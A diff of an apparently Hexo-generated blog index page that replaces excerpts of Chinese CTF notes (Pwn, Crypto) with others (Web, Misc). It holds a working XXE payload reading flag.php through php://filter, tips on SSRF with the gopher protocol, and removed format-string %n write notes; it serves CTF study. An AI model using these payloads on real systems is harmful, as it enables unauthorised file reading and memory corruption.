@@ -544,7 +544,7 @@ var _hmt = _hmt || [];
 
     
     <article
-  id="post-pwn"
+  id="post-CTF_web"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -555,31 +555,38 @@ var _hmt = _hmt || [];
     <header class="article-header">
        
 <h2 itemprop="name">
-  <a class="article-title" href="/2020/04/pwn/"
-    >CTF Pwn 的杂项笔记</a> 
+  <a class="article-title" href="/2020/04/CTF_web/"
+    >CTF Web 的笔记</a> 
 </h2>
  
 
     </header>
      
     <div class="article-meta">
-      <a href="/2020/04/pwn/" class="article-date">
+      <a href="/2020/04/CTF_web/" class="article-date">
   <time datetime="2020-04-15T16:00:00.000Z" itemprop="datePublished">2020-04-16</time>
 </a>    
     </div>
       
     <div class="article-entry" itemprop="articleBody">
        
-  <p>这里是笔者记录的一些内容较少、不便于整理出一篇博客的<strong>Pwn杂项</strong>知识点。</p>
-<h2 id="1-docker-使用-使用手册">1. docker 使用 - <a href="http://www.docker.org.cn/index.html" target="_blank" rel="noopener">使用手册</a></h2>
-<h2 id="2-漏洞">2. 漏洞</h2>
+  <p>一点点曾经整理的Web笔记，篇幅会相对较小一点。</p>
+<h2 id="1-XXE-攻击-XML">1. XXE 攻击 (XML)</h2>
 <ol>
 <li>
-<p>格式化字符串</p>
- <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// %lln 四字 / %ln 双字 / %hn 单字 / %hhn 字节</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%(n-1)$[format]"</span>); <span class="comment">// -&gt; 第n个参数</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%&#123;n-1&#125;$n"</span>); <span class="comment">// -&gt; 将输出的字符个数写入第n个参数</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%nc"</span>); <span class="comment">// -&gt; 输出对应参数n个字符</span></span><br></pre></td></tr></table></figure>
+<p>示例</p>
+ <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="symbol">&amp;xxe;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">password</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
 </li>
-</ol> 
-      <a class="article-more-link" href="/2020/04/pwn/"
+</ol>
+<h2 id="2-SSRF">2. SSRF</h2>
+<h3 id="函数的注意点">函数的注意点</h3>
+<h4 id="1-cURL">1. cURL</h4>
+<h4 id="2-file-get-contents">2. file_get_contents</h4>
+<ul>
+<li>gopher 协议无法URLencode</li>
+<li>关于gopher的302跳转有bug，导致利用失败</li>
+</ul> 
+      <a class="article-more-link" href="/2020/04/CTF_web/"
         >阅读更多...</a
       >
        
@@ -592,7 +599,7 @@ var _hmt = _hmt || [];
     
     <footer class="article-footer">
        
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>
 
     </footer>
   </div>
@@ -604,7 +611,7 @@ var _hmt = _hmt || [];
 
     
     <article
-  id="post-crypto"
+  id="post-misc"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -615,43 +622,34 @@ var _hmt = _hmt || [];
     <header class="article-header">
        
 <h2 itemprop="name">
-  <a class="article-title" href="/2020/04/crypto/"
-    >CTF Crypto 的笔记</a> 
+  <a class="article-title" href="/2020/04/misc/"
+    >CTF Misc 的笔记</a> 
 </h2>
  
 
     </header>
      
     <div class="article-meta">
-      <a href="/2020/04/crypto/" class="article-date">
+      <a href="/2020/04/misc/" class="article-date">
   <time datetime="2020-04-15T16:00:00.000Z" itemprop="datePublished">2020-04-16</time>
 </a>    
     </div>
       
     <div class="article-entry" itemprop="articleBody">
        
-  <p>一点点Crypto的笔记，真的只有一点点。</p>
-<h2 id="1-RSA">1. RSA</h2>
-<ol>
-<li>RSA 算法原理
-<ol>
-<li><a href="https://wiki.x10sec.org/crypto/asymmetric/rsa/rsa_theory/" target="_blank" rel="noopener">CTF-Wiki</a></li>
-<li><a href="https://www.kancloud.cn/kancloud/rsa_algorithm/48484" target="_blank" rel="noopener">看云</a></li>
-</ol>
-</li>
-<li>分解质数
+  <p>一点点曾经整理的Misc笔记，数量较少。</p>
+<h2 id="1-git">1. git</h2>
 <ol>
 <li>
-<p>命令行分解 - <a href="https://github.com/ryosan-470/factordb-pycli" target="_blank" rel="noopener">Github</a></p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install factordb-pycli</span><br><span class="line">factordb [-h] [--json] number</span><br></pre></td></tr></table></figure>
+<p>查找所有 commit - <a href="https://www.cnblogs.com/Tkitn/p/11648456.html" target="_blank" rel="noopener">参考链接</a></p>
+ <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看所有commit，包括已撤回的提交</span></span><br><span class="line">git <span class="built_in">log</span> --reflog</span><br><span class="line"><span class="comment"># 重置commit头</span></span><br><span class="line">git reset --hard [commit-Hash]</span><br></pre></td></tr></table></figure>
 </li>
 <li>
-<p>在线解两质数相乘 - <a href="http://factordb.com/index.php" target="_blank" rel="noopener">网址</a></p>
-</li>
-</ol>
+<p>查看 git 提交的文件内容 - <a href="https://blog.csdn.net/daguanjia11/article/details/73309026" target="_blank" rel="noopener">git 对象库</a></p>
+ <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看所有提交log（包括已撤回的提交）</span></span><br><span class="line">git <span class="built_in">log</span> --pretty=raw</span><br><span class="line"><span class="comment"># 查看某个Hash值对应的类型</span></span><br><span class="line">git cat-file -t [Hash]</span><br><span class="line"><span class="comment"># 查看某个Hash值对应的内容</span></span><br><span class="line">git cat-file -p [tree/file-Hash]</span><br><span class="line"><span class="comment"># 查看树的内容</span></span><br><span class="line">git ls-tree [-r是否递归][-t输出更完整的信息（包括子树）] [commit/tree-hash]</span><br></pre></td></tr></table></figure>
 </li>
 </ol> 
-      <a class="article-more-link" href="/2020/04/crypto/"
+      <a class="article-more-link" href="/2020/04/misc/"
         >阅读更多...</a
       >
        
@@ -664,7 +662,7 @@ var _hmt = _hmt || [];
     
     <footer class="article-footer">
        
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Misc/" rel="tag">Misc</a></li></ul>
 
     </footer>
   </div>
